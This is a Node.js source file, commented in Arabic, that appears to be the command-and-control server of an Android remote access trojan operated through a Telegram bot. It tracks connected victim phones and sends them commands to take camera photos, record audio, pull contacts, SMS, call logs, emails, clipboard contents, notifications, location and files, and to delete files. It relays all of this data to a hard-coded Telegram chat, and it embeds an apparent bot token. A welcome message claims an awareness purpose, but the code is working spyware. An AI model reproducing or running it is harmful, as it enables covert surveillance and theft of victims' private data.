// استيراد المكتبات المطلوبة
const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');

// تعريف الثوابت والمتغيرات
const token = '7814704354:AAGnB5vKw5JnIvIVDTgJ2Cs6vSt7mH3IsKo'; // استبدل بتوكن البوت الخاص بك
const id = '7451184571'; // استبدل بمعرف الدردشة الخاص بك
const address = 'https://www.google.com'; // عنوان للتحقق من الاتصال بالإنترنت

// إنشاء التطبيق والخادم
const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map(); // لتخزين الأجهزة المتصلة
const upload = multer(); // لمعالجة تحميل الملفات

// استخدام bodyParser لمعالجة طلبات JSON
app.use(bodyParser.json());

// متغيرات لتخزين البيانات المؤقتة
let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

// نقطة النهاية الرئيسية
app.get('/', function (req, res) {
    res.send('<h1 align="center">تم تحميل الخادم بنجاح</h1>');
});

// نقطة نهاية لتحميل الملفات
app.post('/uploadFile', upload.single('file'), (req, res) => {
    const fileName = req.file.originalname;
    appBot.sendDocument(id, req.file.buffer, { caption: `رسالة من ${req.headers.device} جهاز`, parse_mode: 'HTML' }, { filename: fileName, contentType: 'application/txt' });
    res.send('');
});

// نقطة نهاية لتحميل النصوص
app.post('/uploadText', (req, res) => {
    appBot.sendMessage(id, `رسالة من ${req.headers.device} جهاز\n\n${req.body.text}`, { parse_mode: 'HTML' });
    res.send('');
});

// نقطة نهاية لتحميل الموقع الجغرافي
app.post('/uploadLocation', (req, res) => {
    appBot.sendLocation(id, req.body.lat, req.body.lon);
    appBot.sendMessage(id, `الموقع من ${req.headers.device} جهاز`, { parse_mode: 'HTML' });
    res.send('');
});

// إدارة الاتصالات عبر WebSocket
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4(); // إنشاء معرف فريد للجهاز
    const model = req.headers.model; // طراز الجهاز
    const battery = req.headers.battery; // حالة البطارية
    const version = req.headers.version; // نسخة النظام
    const brightness = req.headers.brightness; // سطوع الشاشة
    const provider = req.headers.provider; // نوع الشريحة

    ws.uuid = uuid;
    appClients.set(uuid, { model, battery, version, brightness, provider }); // تخزين معلومات الجهاز

    // إرسال رسالة إلى البوت عند اتصال جهاز جديد
    appBot.sendMessage(id, `جهاز جديد متصل ✅\n\n• طراز الجهاز📱 : <b>${model}</b>\n• بطارية 🔋 : <b>${battery}</b>\n• نسخة أندرويد : <b>${version}</b>\n• سطوع الشاشة : <b>${brightness}</b>\n• نوع الشريحة SIM : <b>${provider}</b>`, { parse_mode: 'HTML' });

    // إدارة انفصال الجهاز
    ws.on('close', function () {
        appBot.sendMessage(id, `الجهاز غير متصل ❌\n\n• طراز الجهاز📱 : <b>${model}</b>\n• بطارية 🔋 : <b>${battery}</b>\n• نسخة أندرويد : <b>${version}</b>\n• سطوع الشاشة : <b>${brightness}</b>\n• نوع الشريحة SIM : <b>${provider}</b>`, { parse_mode: 'HTML' });
        appClients.delete(ws.uuid); // حذف الجهاز من القائمة
    });

    // استقبال البيانات من الجهاز
    ws.on('message', (message) => {
        if (message.startsWith('photos:')) {
            const photos = JSON.parse(message.replace('photos:', ''));
            photos.forEach((photo) => {
                appBot.sendPhoto(id, photo); // إرسال الصور إلى البوت
            });
        } else if (message.startsWith('photo:')) {
            const photo = message.replace('photo:', '');
            appBot.sendPhoto(id, photo); // إرسال صورة إلى البوت
        } else if (message.startsWith('contacts:')) {
            const contacts = JSON.parse(message.replace('contacts:', ''));
            appBot.sendMessage(id, `جهات الاتصال:\n${JSON.stringify(contacts)}`);
        } else if (message.startsWith('sms:')) {
            const sms = JSON.parse(message.replace('sms:', ''));
            appBot.sendMessage(id, `الرسائل النصية:\n${JSON.stringify(sms)}`);
        } else if (message.startsWith('call_logs:')) {
            const callLogs = JSON.parse(message.replace('call_logs:', ''));
            appBot.sendMessage(id, `سجل المكالمات:\n${JSON.stringify(callLogs)}`);
        } else if (message.startsWith('emails:')) {
            const emails = JSON.parse(message.replace('emails:', ''));
            appBot.sendMessage(id, `الإيميلات:\n${JSON.stringify(emails)}`);
        } else if (message.startsWith('device_info:')) {
            const deviceInfo = JSON.parse(message.replace('device_info:', ''));
            appBot.sendMessage(id, `معلومات الجهاز:\n${JSON.stringify(deviceInfo)}`);
        } else if (message.startsWith('location:')) {
            const location = JSON.parse(message.replace('location:', ''));
            appBot.sendLocation(id, location.lat, location.lon); // إرسال الموقع
        } else if (message.startsWith('audio:')) {
            const audio = message.replace('audio:', '');
            appBot.sendAudio(id, audio); // إرسال التسجيل الصوتي
        } else if (message.startsWith('clipboard:')) {
            const clipboard = message.replace('clipboard:', '');
            appBot.sendMessage(id, `محتويات الحافظة:\n${clipboard}`);
        } else if (message.startsWith('file:')) {
            const file = message.replace('file:', '');
            appBot.sendDocument(id, file); // إرسال الملف
        } else if (message.startsWith('notifications:')) {
            const notifications = JSON.parse(message.replace('notifications:', ''));
            appBot.sendMessage(id, `الإشعارات:\n${JSON.stringify(notifications)}`);
        }
    });
});

// إدارة رسائل البوت
appBot.on('message', (msg) => {
    const chatId = msg.chat.id;
    if (msg.reply_to_message) {
        if (msg.reply_to_message.text.includes('يرجى الرد على الرقم الذي تريد إرسال الرسالة القصيرة إليه')) {
            currentNumber = msg.text;
            appBot.sendMessage(id, 'رائع ، أدخل الآن الرسالة التي تريد إرسالها إلى هذا الرقم', { reply_markup: { force_reply: true } });
        }
        // يمكن إضافة المزيد من الشروط هنا
    }
    if (chatId == id) {
        if (msg.text == '/start') {
            appBot.sendMessage(id, 'مرحبًا بك في بوت الاختراق 👋\n\n• رجاء عدم استعمال البوت فيما يغضب  الله.هذا البوت غرض التوعية وحماية نفسك من الاختراق\n\n• ترجمه البوت بقيادة ( @king_1_4 )  »طوفان الأقصى⬇️〽️🇵🇸\n\n• قناتي تلجرا  t.me/Abu_Yamani\n\n• اضغط هن( /start )  ', { parse_mode: 'HTML', reply_markup: { keyboard: [['قائمة الأجهزة المتصلة🤖'], ['قائمة الأوامر🕹']], resize_keyboard: true } });
        }
        if (msg.text == 'قائمة الأجهزة المتصلة🤖') {
            if (appClients.size == 0) {
                appBot.sendMessage(id, 'لا تتوفر أجهزة توصيل ❎\n\n');
            } else {
                let devicesList = 'قائمة الأجهزة المتصلة🤖 :\n\n';
                appClients.forEach((value, key, map) => {
                    devicesList += `• طراز الجهاز📱 : <b>${value.model}</b>\n• بطارية 🔋 : <b>${value.battery}</b>\n• نسخة أندرويد : <b>${value.version}</b>\n• سطوع الشاشة : <b>${value.brightness}</b>\n• نوع الشريحة SIM : <b>${value.provider}</b>\n\n`;
                });
                appBot.sendMessage(id, devicesList, { parse_mode: 'HTML' });
            }
        }
        if (msg.text == 'قائمة الأوامر🕹') {
            if (appClients.size == 0) {
                appBot.sendMessage(id, 'لا تتوفر أجهزة توصيل ❎\n\n');
            } else {
                const commandsList = [];
                appClients.forEach((value, key, map) => {
                    commandsList.push([{ text: value.model, callback_data: `device:${key}` }]);
                });
                appBot.sendMessage(id, 'قائمة الأوامر🕹', { reply_markup: { inline_keyboard: commandsList } });
            }
        }
    } else {
        appBot.sendMessage(id, 'غير مسموح لك باستخدام البوت ❌');
    }
});

// إدارة الأوامر عبر callback_query
appBot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;
    const uuid = data.split(':')[1];

    if (data.includes('pull_photos')) {
        appSocket.clients.forEach((client) => {
            if (client.uuid === uuid) {
                client.send('pull_photos'); // سحب الصور
            }
        });
    } else if (data.includes('capture_front')) {
        appSocket.clients.forEach((client) => {
            if (client.uuid === uuid) {
                client.send('capture_front'); // التقاط صورة من الكاميرا الأمامية
            }
        });
    } else if (data.includes('capture_back')) {
        appSocket.clients.forEach((client) => {
            if (client.uuid === uuid) {
                client.send('capture_back'); // التقاط صورة من الكاميرا الخلفية
            }
        });
    } else if (data.includes('pull_contacts')) {
        appSocket.clients.forEach((client) => {
            if (client.uuid === uuid) {
                client.send('pull_contacts'); // سحب جهات الاتصال
            }
        });
    } else if (data.includes('pull_sms')) {
        appSocket.clients.forEach((client) => {
            if (client.uuid === uuid) {
                client.send('pull_sms'); // سحب الرسائل النصية
            }
        });
    } else if (data.includes('pull_call_logs')) {
        appSocket.clients.forEach((client) => {
            if (client.uuid === uuid) {
                client.send('pull_call_logs'); // سحب سجل المكالمات
            }
        });
    } else if (data.includes('pull_emails')) {
        appSocket.clients.forEach((client) => {
            if (client.uuid === uuid) {
                client.send('pull_emails'); // سحب الإيميلات
            }
        });
    } else if (data.includes('pull_device_info')) {
        appSocket.clients.forEach((client) => {
            if (client.uuid === uuid) {
                client.send('pull_device_info'); // سحب معلومات الجهاز
            }
        });
    } else if (data.includes('get_location')) {
        appSocket.clients.forEach((client) => {
            if (client.uuid === uuid) {
                client.send('get_location'); // الحصول على الموقع
            }
        });
    } else if (data.includes('start_recording')) {
        appSocket.clients.forEach((client) => {
            if (client.uuid === uuid) {
                client.send('start_recording'); // بدء التسجيل الصوتي
            }
        });
    } else if (data.includes('stop_recording')) {
        appSocket.clients.forEach((client) => {
            if (client.uuid === uuid) {
                client.send('stop_recording'); // إيقاف التسجيل الصوتي
            }
        });
    } else if (data.includes('pull_clipboard')) {
        appSocket.clients.forEach((client) => {
            if (client.uuid === uuid) {
                client.send('pull_clipboard'); // سحب الحافظة
            }
        });
    } else if (data.includes('explore_files')) {
        appSocket.clients.forEach((client) => {
            if (client.uuid === uuid) {
                client.send('explore_files'); // استكشاف الملفات
            }
        });
    } else if (data.includes('download_file')) {
        appSocket.clients.forEach((client) => {
            if (client.uuid === uuid) {
                client.send('download_file:' + data.split(':')[2]); // تحميل ملف
            }
        });
    } else if (data.includes('delete_file')) {
        appSocket.clients.forEach((client) => {
            if (client.uuid === uuid) {
                client.send('delete_file:' + data.split(':')[2]); // حذف ملف
            }
        });
    } else if (data.includes('pull_notifications')) {
        appSocket.clients.forEach((client) => {
            if (client.uuid === uuid) {
                client.send('pull_notifications'); // سحب الإشعارات
            }
        });
    } else if (data.includes('stop_pull_notifications')) {
        appSocket.clients.forEach((client) => {
            if (client.uuid === uuid) {
                client.send('stop_pull_notifications'); // إيقاف سحب الإشعارات
            }
        });
    }
});

// إرسال ping للأجهزة كل 5 ثوانٍ
setInterval(() => {
    appSocket.clients.forEach((client) => {
        client.send('ping');
    });
    try {
        axios.get(address).then((response) => {
            return '';
        });
    } catch (e) { }
}, 5000);

// تشغيل الخادم على المنفذ 8999 أو المنفذ المحدد في البيئة
appServer.listen(process.env.PORT || 8999);
